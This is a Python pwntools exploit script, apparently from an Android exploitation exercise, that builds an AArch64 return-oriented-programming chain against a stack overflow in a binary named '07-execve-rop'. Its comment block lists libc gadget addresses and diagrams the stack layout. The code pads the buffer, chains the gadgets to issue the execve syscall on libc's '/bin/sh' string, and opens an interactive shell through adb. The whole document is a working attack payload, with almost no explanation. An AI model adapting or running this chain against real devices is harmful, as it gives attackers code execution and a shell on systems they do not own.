#!/usr/bin/python

'''
Gadgets:
gg1:    0x0001c598: ldp x29, x30, [sp, #0x40]; ldp x20, x19, [sp, #0x30]; ldp x22, x21, [sp, #0x20]; ldp x24, x23, [sp, #0x10]; ldp x26, x25, [sp], #0x50; ret;
gg2:    0x00021b64: mov x0, x20; mov x1, x21; mov x2, x25; mov w3, w24; blr x19;
gg3:    0x0007b1ec: movz x8, #0xdd; svc #0;

Stack:

            0x8: gg2
x30         ----
            0x8
x29         ----
            0x8: gg3
x19         ----
            0x8: sh_addr
x20         ----
            0x8: 0
x21         ----
            0x8
x22         ----
            0x8
x23         ----
            0x8
x24         ----
            0x8: 0
x25         ----
            0x8
x26         ----        <- gg1_sp
            0x8: gg1
x30         ----
            0x8
x29         ----
            0x80
buffer      ----
            0x30
            ----        <- vul_sp
'''

from pwn import *
context(arch='aarch64', endian='little', word_size=64, os='android')


libc_addr = 0x7fbf3c1000
gg1 = libc_addr + 0x0001c598
gg2 = libc_addr + 0x00021b64
gg3 = libc_addr + 0x0007b1ec

libc_path = 'libc.so'
libc_elf = ELF(libc_path)
sh_addr = libc_addr + libc_elf.search('/bin/sh\x00').next()

payload = 'a' * 136
payload += p64(gg1)
payload += 'a' * 8
payload += p64(0)
payload += 'a' * 24
payload += p64(0)
payload += p64(sh_addr)
payload += p64(gg3)
payload += 'a' * 8
payload += p64(gg2)

bin_path = '/data/local/tmp/07-execve-rop'
proc = adb.process([bin_path])
proc.recvuntil('> ')
proc.send(payload)
proc.interactive()
